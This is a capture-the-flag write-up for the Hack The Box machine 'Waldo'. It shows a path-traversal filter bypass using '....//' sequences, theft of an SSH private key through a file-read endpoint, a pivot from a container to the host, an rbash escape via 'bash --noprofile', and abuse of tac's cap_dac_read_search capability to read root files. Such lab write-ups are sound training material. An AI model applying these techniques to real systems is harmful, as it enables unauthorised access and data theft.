---
layout: single
title: Waldo - Hack The Box
date: 2018-12-15
classes: wide
header:
  teaser: /assets/images/htb-writeup-waldo/waldo.png
categories:
  - hackthebox
  - infosec
tags:
  - hackthebox
  - linux
  - capabilities
  - php

---

## Linux / 10.10.10.87

![](/assets/images/htb-writeup-waldo/waldo.png)

This blog post is a writeup of the Waldo machine from Hack the Box.

### Summary
------------------
- The webserver has a vulnerable function that can be used to browse directories and read files
- We can read the SSH private key from the `nobody` user home directory and log in as `nobody`
- We're within a container but we can log in with SSH as user `monitor` to the host (127.0.0.1)
- There's a logMonitor application running with elevated capabilities (it can read log files even if not running as root)
- This is a hint that we should be looking at capabilities of files (`cap_dac_read_search+ei`)
- We look at the entire filesystem for files with special cap's and we find that the `tac` application has that capabily and we can read `/root/root.txt`

### Detailed steps
------------------

### Nmap

There's only a webserver and an SSH service running on this box

```
root@darkisland:~# nmap -sC -sV -p- 10.10.10.87
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-04 21:08 EDT
Nmap scan report for waldo.htb (10.10.10.87)
Host is up (0.018s latency).
Not shown: 65532 closed ports
PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 c4:ff:81:aa:ac:df:66:9e:da:e1:c8:78:00:ab:32:9e (RSA)
|   256 b3:e7:54:6a:16:bd:c9:29:1f:4a:8c:cd:4c:01:24:27 (ECDSA)
|_  256 38:64:ac:57:56:44:d5:69:de:74:a8:88:dc:a0:b4:fd (ED25519)
80/tcp   open     http           nginx 1.12.2
|_http-server-header: nginx/1.12.2
| http-title: List Manager
|_Requested resource was /list.html
|_http-trane-info: Problem with XML parsing of /evox/about
8888/tcp filtered sun-answerbook

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.87 seconds
```

### Web enumeration

The webpage is a simple application that displays and manages "lists", and is using Javascript/Ajax.

![Web application](/assets/images/htb-writeup-waldo/web1.png)

![Web application source](/assets/images/htb-writeup-waldo/web2.png)

In the javascript source code (list.js), the `readFile` function can be abused to read source code of other PHP files in the directory:

```js
function readFile(file){ 
  var xhttp = new XMLHttpRequest();
  xhttp.open("POST","fileRead.php",false);
  xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhttp.send('file=' + file);
  if (xhttp.readyState === 4 && xhttp.status === 200) {
    return xhttp.responseText;
  }else{
  }
}
```

![fileRead.php](/assets/images/htb-writeup-waldo/fileread.png)

The various files we read are:
 - [fileRead.php](fileRead.php)
 - [fileWrite.php](fileWrite.php)
 - [fileDelete.php](fileDelete.php)
 - [dirRead.php](dirRead.php)

 The first thing I tried was to use `fileWrite` to write an arbitrary PHP file in the `.list` directory but the filename is derived from the `listnum` parameter which is checked to make sure it's numeric (PHP's is_numeric() function). So we can't write files with the appropriate extension and execute code.

 Next, I looked at the dirRead.php file to try to enumerate the file system. The function uses a `str_array` filter to replace characters that could be used for path traversal:

 ```
 str_replace(array("../", "..\"), "", $_POST['path'])
 ```

So something like `../../../../../` will get replaced with an empty string which is going to default to the current directory.

We can verify with using the interactive PHP interpreter:

```
root@darkisland:~# php -a
Interactive mode enabled

php > 
php > echo str_replace( array("../", "..\\"), "", array("../../../../"))[0];
php >
php > echo str_replace( array("../", "..\\"), "", array("this_is_not_blacklisted"))[0];
this_is_not_blacklisted
```

We can bypass the filter by using the following sequence: `....//....//....//....//`

```
php > echo str_replace( array("../", "..\\"), "", array("....//....//....//....//"))[0];
../../../../
```

Running it on the target system, we are able to navigate to the user directory:

![readdir](/assets/images/htb-writeup-waldo/readdir.png)

The `.monitor` file looks interesting, we'll use the `fileRead.php` function to read it:

![SSH key](/assets/images/htb-writeup-waldo/sshkey.png)

### Initial shell access

Using the SSH private key we obtained, we can log in as user `nobody`:

```
root@darkisland:~/hackthebox/Machines/Waldo# ssh -i waldo.key nobody@10.10.10.87
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <http://wiki.alpinelinux.org>.
waldo:~$ ls
user.txt
waldo:~$ cat user.txt
32768b<redacted>
```

### Pivoting to the host OS and privesc

There isn't much else we can do as user `nobody` since we are in a container.

We can however pivot to the host OS by re-using the same key and logging in as user `monitor`:

```
waldo:~/.ssh$ ssh -i .monitor monitor@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:YHb7KyiwRxyN62du1P80KmeA9Ap50jgU6JlRaXThs/M.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
Linux waldo 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1 (2018-04-29) x86_64
           &.                                                                  
          @@@,@@/ %                                                            
       #*/%@@@@/.&@@,                                                          
   @@@#@@#&@#&#&@@@,*%/                                                        
   /@@@&###########@@&*(*                                                      
 (@################%@@@@@.     /**                                             
 @@@@&#############%@@@@@@@@@@@@@@@@@@@@@@@@%((/                               
 %@@@@%##########&@@@....                 .#%#@@@@@@@#                         
 @@&%#########@@@@/                        */@@@%(((@@@%                       
    @@@#%@@%@@@,                       *&@@@&%(((#((((@@(                      
     /(@@@@@@@                     *&@@@@%((((((((((((#@@(                     
       %/#@@@/@ @#/@          ..@@@@%(((((((((((#((#@@@@@@@@@@@@&#,            
          %@*(@#%@.,       /@@@@&(((((((((((((((&@@@@@@&#######%%@@@@#    &    
        *@@@@@#        .&@@@#(((#(#((((((((#%@@@@@%###&@@@@@@@@@&%##&@@@@@@/   
       /@@          #@@@&#(((((((((((#((@@@@@%%%%@@@@%#########%&@@@@@@@@&     
      *@@      *%@@@@#((((((((((((((#@@@@@@@@@@%####%@@@@@@@@@@@@###&@@@@@@@&  
      %@/ .&%@@%#(((((((((((((((#@@@@@@@&#####%@@@%#############%@@@&%##&@@/   
      @@@@@@%(((((((((((##(((@@@@&%####%@@@%#####&@@@@@@@@@@@@@@@&##&@@@@@@@@@/
     @@@&(((#((((((((((((#@@@@@&@@@@######@@@###################&@@@&#####%@@* 
     @@#(((((((((((((#@@@@%&@@.,,.*@@@%#####@@@@@@@@@@@@@@@@@@@%####%@@@@@@@@@@
     *@@%((((((((#@@@@@@@%#&@@,,.,,.&@@@#####################%@@@@@@%######&@@.
       @@@#(#&@@@@@&##&@@@&#@@/,,,,,,,,@@@&######&@@@@@@@@&&%######%@@@@@@@@@@@
        @@@@@@&%&@@@%#&@%%@@@@/,,,,,,,,,,/@@@@@@@#/,,.*&@@%&@@@@@@&%#####%@@@@.
          .@@@###&@@@%%@(,,,%@&,.,,,,,,,,,,,,,.*&@@@@&(,*@&#@%%@@@@@@@@@@@@*   
            @@%##%@@/@@@%/@@@@@@@@@#,,,,.../@@@@@%#%&@@@@(&@&@&@@@@(           
            .@@&##@@,,/@@@@&(.  .&@@@&,,,.&@@/         #@@%@@@@@&@@@/          
           *@@@@@&@@.*@@@          %@@@*,&@@            *@@@@@&.#/,@/          
          *@@&*#@@@@@@@&     #@(    .@@@@@@&    ,@@@,    @@@@@(,@/@@           
          *@@/@#.#@@@@@/    %@@@,   .@@&%@@@     &@&     @@*@@*(@@#            
           (@@/@,,@@&@@@            &@@,,(@@&          .@@%/@@,@@              
             /@@@*,@@,@@@*         @@@,,,,,@@@@.     *@@@%,@@**@#              
               %@@.%@&,(@@@@,  /&@@@@,,,,,,,%@@@@@@@@@@%,,*@@,#@,              
                ,@@,&@,,,,(@@@@@@@(,,,,,.,,,,,,,,**,,,,,,.*@/,&@               
                 &@,*@@.,,,,,..,,,,&@@%/**/@@*,,,,,&(.,,,.@@,,@@               
                 /@%,&@/,,,,/@%,,,,,*&@@@@@#.,,,,,.@@@(,,(@@@@@(               
                  @@*,@@,,,#@@@&*..,,,,,,,,,,,,/@@@@,*(,,&@/#*                 
                  *@@@@@(,,@*,%@@@@@@@&&#%@@@@@@@/,,,,,,,@@                    
                       @@*,,,,,,,,,.*/(//*,..,,,,,,,,,,,&@,                    
                        @@,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,@@                     
                        &@&,,,,,,,,,,,,,,,,,,,,,,,,,,,,&@#                     
                         %@(,,,,,,,,,,,,,,,,,,,,,,,,,,,@@                      
                         ,@@,,,,,,,,@@@&&&%&@,,,,,..,,@@,                      
                          *@@,,,,,,,.,****,..,,,,,,,,&@@                       
                           (@(,,,.,,,,,,,,,,,,,,.,,,/@@                        
                           .@@,,,,,,,,,,,,,...,,,,,,@@                         
                            ,@@@,,,,,,,,,,,,,,,,.(@@@                          
                              %@@@@&(,,,,*(#&@@@@@@,     
                              
                            Here's Waldo, where's root?
Last login: Tue Jul 24 08:09:03 2018 from 127.0.0.1
-rbash: alias: command not found
```

It seems we are in a restricted bash shell since we can't run arbitrary comands:

```
monitor@waldo:~$ cd /
-rbash: cd: restricted
monitor@waldo:~$ ls
app-dev  bin
monitor@waldo:~$ cd bin
-rbash: cd: restricted
monitor@waldo:~$ ls
app-dev  bin
monitor@waldo:~$ ls bin
ls  most  red  rnano
monitor@waldo:~$ 
```

We can easily bypass rbash by skipping the profile of the user with the `-t bash --noprofile` arguments:

```
waldo:~/.ssh$ ssh -i .monitor monitor@127.0.0.1 -t bash --noprofile
monitor@waldo:~$ 
```

However our PATH is no longer set so we'll need to set it manually:

```
monitor@waldo:~$ echo $PATH
/home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1
monitor@waldo:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
monitor@waldo:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1
```

Now that we have access with a regular shell, we can start looking around.

In the `app-dev` directory of the `monitor` home directory, there is a log monitoring application along with the source code. The application simply reads hardcoded log files based on the CLI argument passed to it:

```c
[...]
case 'a' :
          strncpy(filename, "/var/log/auth.log", sizeof(filename));
          printFile(filename);
          break;
        case 'A' :
          strncpy(filename, "/var/log/alternatives.log", sizeof(filename));
          printFile(filename);
          break;
        case 'b' :
          strncpy(filename, "/var/log/btmp",sizeof(filename));
          printFile(filename);
          break;
        case 'd' :
          strncpy(filename, "/var/log/daemon.log",sizeof(filename));
          printFile(filename);
          break;
        case 'D' :
          strncpy(filename, "/var/log/dpkg.log",sizeof(filename));
          printFile(filename);
          break;
[...]
```         

We can modify the source code and re-compile it but it's not running as root so any modifications we make like adding a `/bin/bash` shell argument option will only result in a shell running as user `monitor`. At first, it seemed like this was a box with a cronjob running every few minutes that would compile and run the program but this isn't the case.

Next, we looked at the `v0.1` directory that contains yet another copy of the software. The interesting part here is that the application is able to read log files even though it doesn't have the SUID bit set:

```
monitor@waldo:~/app-dev$ ./logMonitor -a
Cannot open file

monitor@waldo:~/app-dev/v0.1$ ./logMonitor-0.1 -a
Aug  4 21:17:01 waldo CRON[938]: pam_unix(cron:session): session opened for user root by (uid=0)
Aug  4 21:17:01 waldo CRON[938]: pam_unix(cron:session): session closed for user root
Aug  4 22:00:37 waldo sshd[980]: Accepted publickey for monitor from 127.0.0.1 port 57202 ssh2: RSA SHA256:Kl+zDjbDx4fQ7xVvGg6V3RhjezqB1gfe2kWqm1AMD0c
[...]

monitor@waldo:~/app-dev$ ls -l logMonitor
-rwxrwx--- 1 app-dev monitor 13704 Jul 24 08:10 logMonitor
monitor@waldo:~/app-dev$ ls -l v0.1/logMonitor-0.1 
-r-xr-x--- 1 app-dev monitor 13706 May  3 16:50 v0.1/logMonitor-0.1
```

So, both files are owned by the same user and do not have the SUID bit set... Why is the v0.1 file able to read log files then?

Let's look at file capabilities:

```
monitor@waldo:~$ getcap -r *
app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei
```

The `cap_dac_read_search` capability is used to `Bypass file read permission checks and directory read and execute permission checks`. So basically, if a file has this permission it can read anything.

We can't use this file to read anything other than log files but maybe there are other similar files on the host:

```
monitor@waldo:~$ getcap -r /* 2>/dev/null
/home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei
/usr/bin/tac = cap_dac_read_search+ei
```

What is this `tac` binary?

```
monitor@waldo:~$ /usr/bin/tac --help
Usage: /usr/bin/tac [OPTION]... [FILE]...
Write each FILE to standard output, last line first.
```

Ok, we can use this to read files, let's grab root.txt and finish this box:

```
monitor@waldo:~$ tac /root/root.txt
8fb67c<redacted>
```